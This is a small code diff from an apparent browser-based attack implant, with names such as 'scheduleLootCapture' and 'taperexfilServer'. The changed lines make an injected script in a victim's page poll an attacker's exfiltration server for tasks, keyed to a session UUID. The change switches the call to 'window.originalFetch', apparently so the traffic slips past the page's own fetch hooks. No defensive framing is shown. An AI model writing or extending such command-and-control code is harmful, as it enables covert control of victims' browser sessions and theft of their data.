@@ -1556,7 +1556,7 @@ function scheduleLootCapture(delay) {
 			}
 		} else {
   	// Unencrypted/Obfuscated version
-			var taskRequest = await fetch(
+			var taskRequest = await window.originalFetch(
 				taperexfilServer + "/client/taskCheck/" + sessionStorage.getItem("taperSessionUUID")
 				);
 			var jsonResponse = await taskRequest.json();
